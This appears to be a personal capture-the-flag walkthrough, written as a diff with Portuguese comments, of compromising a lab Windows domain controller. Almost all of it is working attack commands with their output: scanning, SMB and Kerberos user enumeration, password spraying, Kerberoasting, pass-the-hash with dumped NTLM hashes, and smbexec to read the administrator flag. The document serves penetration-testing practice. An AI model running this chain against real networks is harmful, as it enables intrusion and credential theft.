@@ -1,0 +1,195 @@
+--> sudo rustscan -a 10.67.182.56
+
+Open 10.67.182.56:53
+Open 10.67.182.56:88
+Open 10.67.182.56:135
+Open 10.67.182.56:139
+Open 10.67.182.56:389
+Open 10.67.182.56:445
+Open 10.67.182.56:464
+Open 10.67.182.56:593
+Open 10.67.182.56:636
+Open 10.67.182.56:3268
+Open 10.67.182.56:3269
+Open 10.67.182.56:3389
+Open 10.67.182.56:9389
+Open 10.67.182.56:49664
+Open 10.67.182.56:49666
+Open 10.67.182.56:49676
+Open 10.67.182.56:49737
+
+--> sudo nmap -sV -sC -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49676,49737 10.67.182.56
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-08 01:51:33Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-03-08T01:53:03+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: SOUPEDECODE
+|   NetBIOS_Domain_Name: SOUPEDECODE
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: SOUPEDECODE.LOCAL
+|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-08T01:52:23+00:00
+| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
+| Not valid before: 2026-03-07T01:43:37
+|_Not valid after:  2026-09-06T01:43:37
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49737/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-03-08T01:52:26
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+DOMAIN:SOUPEDECODE
+DNS_DOMAIN:SOUPEDECODE.LOCAL
+
+--> smbclient -L \\\\10.67.182.56 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	backup          Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+
+--> smbmap -H 10.67.182.56 -d soupedecode.local -u guest -p ''
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)                                
+                                                                                                    
+[+] IP: 10.67.182.56:445	Name: soupedecoder.thm    	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	backup                                            	NO ACCESS	
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	SYSVOL                                            	NO ACCESS	Logon server share 
+	Users                                             	NO ACCESS
+
+--> kerbrute userenum --dc soupedecode.local -d soupedecode.local ~/Downloads/Wordlists/username.txt
+
+2026/03/07 23:06:35 >  [+] VALID USERNAME:	 guest@soupedecode.local
+2026/03/07 23:06:35 >  [+] VALID USERNAME:	 administrator@soupedecode.local
+2026/03/07 23:06:35 >  [+] VALID USERNAME:	 Administrator@soupedecode.local
+2026/03/07 23:06:35 >  [+] VALID USERNAME:	 admin@soupedecode.local
+2026/03/07 23:06:35 >  [+] VALID USERNAME:	 admin@soupedecode.local
+2026/03/07 23:06:36 >  [+] VALID USERNAME:	 Administrator@soupedecode.local
+2026/03/07 23:06:36 >  [+] VALID USERNAME:	 Guest@soupedecode.local
+2026/03/07 23:06:36 >  [+] VALID USERNAME:	 DC01$@soupedecode.local
+2026/03/07 23:06:36 >  [+] VALID USERNAME:	 charlie@soupedecode.local
+2026/03/07 23:06:48 >  [+] VALID USERNAME:	 guest@soupedecode.local
+2026/03/07 23:06:49 >  [+] VALID USERNAME:	 Charlie@soupedecode.local
+2026/03/07 23:07:12 >  [+] VALID USERNAME:	 administrator@soupedecode.local
+2026/03/07 23:07:14 >  [+] VALID USERNAME:	 Admin@soupedecode.local
+
+--> netexec smb 10.67.182.56 -u guest -p '' --shares
+
+SMB         10.67.182.56    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) 
+SMB         10.67.182.56    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
+SMB         10.67.182.56    445    DC01             [*] Enumerated shares
+SMB         10.67.182.56    445    DC01             Share           Permissions     Remark
+SMB         10.67.182.56    445    DC01             -----           -----------     ------
+SMB         10.67.182.56    445    DC01             ADMIN$                          Remote Admin
+SMB         10.67.182.56    445    DC01             backup                          
+SMB         10.67.182.56    445    DC01             C$                              Default share
+SMB         10.67.182.56    445    DC01             IPC$            READ            Remote IPC
+SMB         10.67.182.56    445    DC01             NETLOGON                        Logon server share 
+SMB         10.67.182.56    445    DC01             SYSVOL                          Logon server share 
+SMB         10.67.182.56    445    DC01             Users  
+
+--> rpcclient 10.67.182.56 -U guest (Não retornou nada, user sem privilégio nenhum)
+--> nxc smb soupdecode.local -u guest -p '' --rid (Funcionou porque a partição IPC$ é leitura)
+	|_> Retornei a lista de usuários
+	|_> Meu script em python3 fez a limpa e retornou os usuários válidos
+
+--> netexec smb 10.67.182.56 -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success
+--> Mesma lista de usuários foi usada para senhas porque muitos usam a mesma senha como nome de usuário
+
+SMB         10.67.182.56    445    DC01             [+] SOUPEDECODE.LOCAL\DC01:DC01 (Guest)
+SMB         10.67.182.56    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+
+Username: ybob317
+Password: ybob317
+
+--> smbclient \\\\10.67.182.56\\Users -U ybob317
+
+smb: \> dir
+  .                                  DR        0  Thu Jul  4 19:48:22 2024
+  ..                                DHS        0  Sat Mar  7 22:44:21 2026
+  admin                               D        0  Thu Jul  4 19:49:01 2024
+  Administrator                       D        0  Sat Mar  7 22:54:00 2026
+  All Users                       DHSrn        0  Sat May  8 05:26:16 2021
+  Default                           DHR        0  Sat Jun 15 23:51:08 2024
+  Default User                    DHSrn        0  Sat May  8 05:26:16 2021
+  desktop.ini                       AHS      174  Sat May  8 05:14:03 2021
+  Public                             DR        0  Sat Jun 15 14:54:32 2024
+  ybob317                             D        0  Mon Jun 17 14:24:32 2024
+
+		12942591 blocks of size 4096. 10707622 blocks available
+
+FLAG 1: \ybob13\Desktop --> SMB
+
+--> GetUserSPNs.py soupedecode.local/ybob317:ybob317 -dc-ip 10.67.182.56 -request -output hashes.txt
+--> Password: Password123!!
+--> nxc smb soupdecode.local -u 'file_svc' -p 'Password123!!' --shares
+
+SMB         10.67.182.56    445    DC01             Share           Permissions     Remark
+SMB         10.67.182.56    445    DC01             -----           -----------     ------
+SMB         10.67.182.56    445    DC01             ADMIN$                          Remote Admin
+SMB         10.67.182.56    445    DC01             backup          READ            
+SMB         10.67.182.56    445    DC01             C$                              Default share
+SMB         10.67.182.56    445    DC01             IPC$            READ            Remote IPC
+SMB         10.67.182.56    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.67.182.56    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.67.182.56    445    DC01             Users                           
+
+--> PODE SER LIDO O: BACKUP
+
+--> smbclient \\\\10.67.182.56\\backup -U file_svc
+--> Password: Password123!!
+
+smb: \> ls
+  .                                   D        0  Mon Jun 17 14:41:17 2024
+  ..                                 DR        0  Fri Jul 25 14:51:20 2025
+  backup_extract.txt                  A      892  Mon Jun 17 05:41:05 2024
+
+--> get backup_extract.txt
+--> cat backup_extract.txt | cut -d ':' -f 1 > usernames_extraidos.txt
+--> cut -d: -f4 backup_extract.txt > hashes_ntlm.txt
+
+--> netexec smb 10.67.182.56 -u usernames_extraidos.txt -H hashes_ntlm.txt --no-bruteforce
+
+
+SMB  10.67.182.56    445    DC01   [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+
+
+--> smbexec.py 'FileServer$'@soupedecode.local -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
+--> type \Users\Administrator\Desktop\root.txt
+
+FLAG 2: \Users\Administrator\Desktop\root.txt
+
